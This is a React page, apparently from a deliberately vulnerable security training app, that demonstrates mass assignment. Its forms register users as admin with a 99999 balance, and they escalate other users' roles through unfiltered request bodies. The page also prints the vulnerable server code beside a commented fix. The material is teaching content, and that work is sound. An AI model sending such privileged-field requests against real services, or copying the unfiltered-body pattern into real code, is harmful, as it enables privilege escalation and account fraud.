import { useState } from "react";
import api from "../utils/api";
import { useAuth } from "../context/AuthContext";

export default function MassAssignPage() {
  const { user, login } = useAuth();
  const [activeTab, setActiveTab] = useState("register");
  const [result, setResult] = useState(null);
  const [loading, setLoading] = useState(false);

  // Register with elevated role
  const [regForm, setRegForm] = useState({
    username: "",
    email: "",
    password: "hacker123",
    role: "admin",
    balance: "99999",
  });

  // Update with mass assignment
  const [updateForm, setUpdateForm] = useState({
    targetId: "",
    role: "admin",
    balance: "",
  });

  const registerMassAssign = async () => {
    setLoading(true);
    setResult(null);
    try {
      const res = await api.post("/auth/register", regForm);
      setResult({ success: true, data: res.data });
    } catch (err) {
      setResult({ success: false, data: err.response?.data });
    } finally {
      setLoading(false);
    }
  };

  const updateMassAssign = async () => {
    setLoading(true);
    setResult(null);
    try {
      const payload = {};
      if (updateForm.role) payload.role = updateForm.role;
      if (updateForm.balance) payload.balance = parseFloat(updateForm.balance);
      const res = await api.put(`/users/${updateForm.targetId}`, payload);
      setResult({ success: true, data: res.data });
    } catch (err) {
      setResult({ success: false, data: err.response?.data });
    } finally {
      setLoading(false);
    }
  };

  const randomUsername = () => {
    const names = ["hax0r", "shadow", "phantom", "ghost", "cipher"];
    return names[Math.floor(Math.random() * names.length)] + Math.floor(Math.random() * 9999);
  };

  return (
    <div className="page">
      <div className="page-header">
        <div className="page-title"><span>MASS</span> ASSIGNMENT</div>
        <div className="page-subtitle">VERTICAL ESCALATION VIA UNFILTERED REQUEST BODY PARAMETERS</div>
        <div className="cve-tag">⊘ OWASP API3:2023 — Broken Object Property Level Authorization</div>
      </div>

      <div className="attack-info">
        HOW IT WORKS: The registration and update endpoints accept ALL fields from the request body without
        filtering — including privileged fields like 'role' and 'balance'. An attacker can register directly
        as an admin or update any account's role by including these hidden fields in a normal request.{"\n\n"}
        REAL WORLD: GitHub had a mass assignment bug in 2012 that allowed attackers to add SSH keys to any repo.
      </div>

      <div className="grid-2">
        <div>
          <div className="card">
            <div className="card-title">⊘ ATTACK TYPE</div>
            <div style={{ display: "flex", gap: 8, marginBottom: 20 }}>
              {["register", "update"].map((tab) => (
                <button
                  key={tab}
                  onClick={() => { setActiveTab(tab); setResult(null); }}
                  className={`btn ${activeTab === tab ? "btn-red" : "btn-outline"}`}
                  style={{ fontSize: 11, padding: "7px 16px" }}
                >
                  {tab === "register" ? "⊘ REGISTER AS ADMIN" : "⊘ ESCALATE EXISTING"}
                </button>
              ))}
            </div>

            {activeTab === "register" && (
              <>
                <div className="attack-warning">
                  ATTACK: POST /api/auth/register{"\n"}
                  Includes hidden field: role:"{regForm.role}", balance:{regForm.balance}{"\n"}
                  Server blindly accepts ALL body fields — no field whitelist
                </div>

                <div className="form-group">
                  <label className="form-label">USERNAME</label>
                  <div style={{ display: "flex", gap: 8 }}>
                    <input
                      className="form-input"
                      value={regForm.username}
                      onChange={(e) => setRegForm({ ...regForm, username: e.target.value })}
                      placeholder="attacker_username"
                    />
                    <button
                      className="btn btn-outline"
                      onClick={() => setRegForm({ ...regForm, username: randomUsername() })}
                      style={{ fontSize: 11, whiteSpace: "nowrap" }}
                    >
                      RANDOM
                    </button>
                  </div>
                </div>

                <div className="form-group">
                  <label className="form-label">EMAIL</label>
                  <input
                    className="form-input"
                    value={regForm.email}
                    onChange={(e) => setRegForm({ ...regForm, email: e.target.value })}
                    placeholder={`${regForm.username || "hacker"}@evil.com`}
                  />
                </div>

                <div className="grid-2" style={{ gap: 10 }}>
                  <div className="form-group">
                    <label className="form-label" style={{ color: "var(--red)" }}>
                      ROLE (HIDDEN FIELD ⚡)
                    </label>
                    <select
                      className="form-select"
                      value={regForm.role}
                      onChange={(e) => setRegForm({ ...regForm, role: e.target.value })}
                    >
                      <option value="user">user</option>
                      <option value="moderator">moderator</option>
                      <option value="admin">admin</option>
                    </select>
                  </div>
                  <div className="form-group">
                    <label className="form-label" style={{ color: "var(--red)" }}>
                      BALANCE (HIDDEN FIELD ⚡)
                    </label>
                    <input
                      className="form-input"
                      type="number"
                      value={regForm.balance}
                      onChange={(e) => setRegForm({ ...regForm, balance: e.target.value })}
                      placeholder="99999"
                    />
                  </div>
                </div>

                <button
                  className="btn btn-red"
                  onClick={registerMassAssign}
                  disabled={loading || !regForm.username}
                  style={{ width: "100%" }}
                >
                  {loading ? "REGISTERING..." : "⊘ REGISTER WITH HIDDEN FIELDS"}
                </button>
              </>
            )}

            {activeTab === "update" && (
              <>
                <div className="attack-warning">
                  ATTACK: PUT /api/users/{updateForm.targetId || ":id"}{"\n"}
                  Sends role/balance in update body — server updates ALL received fields{"\n"}
                  Combine with IDOR to escalate ANY user's account
                </div>

                <div className="form-group">
                  <label className="form-label">TARGET USER ID</label>
                  <input
                    className="form-input"
                    type="number"
                    value={updateForm.targetId}
                    onChange={(e) => setUpdateForm({ ...updateForm, targetId: e.target.value })}
                    placeholder={`Your ID: ${user?.id} — target others`}
                  />
                </div>

                <div className="grid-2" style={{ gap: 10 }}>
                  <div className="form-group">
                    <label className="form-label" style={{ color: "var(--red)" }}>ESCALATE ROLE TO</label>
                    <select
                      className="form-select"
                      value={updateForm.role}
                      onChange={(e) => setUpdateForm({ ...updateForm, role: e.target.value })}
                    >
                      <option value="">— no change —</option>
                      <option value="moderator">moderator</option>
                      <option value="admin">admin</option>
                    </select>
                  </div>
                  <div className="form-group">
                    <label className="form-label" style={{ color: "var(--red)" }}>SET BALANCE TO</label>
                    <input
                      className="form-input"
                      type="number"
                      value={updateForm.balance}
                      onChange={(e) => setUpdateForm({ ...updateForm, balance: e.target.value })}
                      placeholder="e.g. 999999"
                    />
                  </div>
                </div>

                <button
                  className="btn btn-red"
                  onClick={updateMassAssign}
                  disabled={loading || !updateForm.targetId}
                  style={{ width: "100%" }}
                >
                  {loading ? "ESCALATING..." : "⊘ MASS ASSIGN UPDATE"}
                </button>
              </>
            )}
          </div>
        </div>

        {/* Response */}
        <div>
          <div className="card" style={{ height: "100%" }}>
            <div className="card-title">◈ SERVER RESPONSE</div>

            {!result && <div className="loading">AWAITING MASS ASSIGNMENT ATTACK...</div>}

            {result?.success && (
              <>
                <div className="attack-success">
                  ⊘ MASS ASSIGNMENT SUCCEEDED
                </div>

                {result.data?.user && (
                  <div style={{ display: "grid", gap: 8, marginBottom: 16 }}>
                    {[
                      { label: "USERNAME", value: result.data.user.username },
                      { label: "ROLE ASSIGNED 🔥", value: result.data.user.role },
                      { label: "USER ID", value: result.data.user.id },
                    ].map(({ label, value }) => (
                      <div key={label} style={{
                        display: "flex",
                        justifyContent: "space-between",
                        background: label.includes("🔥") ? "var(--red-faint)" : "var(--bg-3)",
                        padding: "8px 12px",
                        borderRadius: 6,
                        border: `1px solid ${label.includes("🔥") ? "var(--border)" : "var(--border-dim)"}`,
                      }}>
                        <span style={{ fontFamily: "var(--mono)", fontSize: 10, color: "var(--text-faint)" }}>{label}</span>
                        <span style={{
                          fontFamily: "var(--mono)",
                          fontSize: 13,
                          color: label.includes("🔥") ? "var(--red)" : "var(--text)",
                          fontWeight: label.includes("🔥") ? 700 : 400,
                        }}>{String(value)}</span>
                      </div>
                    ))}
                  </div>
                )}
              </>
            )}

            {result && !result.success && (
              <div className="attack-warning" style={{ marginBottom: 12 }}>
                ✗ ATTACK FAILED — {result.data?.error}
              </div>
            )}

            {result && (
              <>
                <div className="form-label" style={{ marginBottom: 8 }}>RAW RESPONSE</div>
                <div className={`response-box ${result.success ? "success" : "error-box"}`}>
                  {JSON.stringify(result.data, null, 2)}
                </div>
              </>
            )}
          </div>
        </div>
      </div>

      {/* Vulnerable code */}
      <div className="card">
        <div className="card-title">◈ VULNERABLE CODE — WHY THIS WORKS</div>
        <div className="response-box" style={{ maxHeight: 160 }}>
{`// routes/auth.js — Mass assignment vulnerability
router.post('/register', (req, res) => {
  // ❌ VULNERABILITY: Destructures ALL fields including privileged ones
  const { username, email, password, role, balance } = req.body;
  const userRole = role || 'user';  // Attacker sends role: "admin"

  // ✅ FIX: Only extract safe fields, ignore role/balance
  // const { username, email, password } = req.body;
  // const userRole = 'user'; // Always default, never from request
  db.run('INSERT INTO users (role) VALUES (?)', [userRole]);
});`}
        </div>
      </div>
    </div>
  );
}
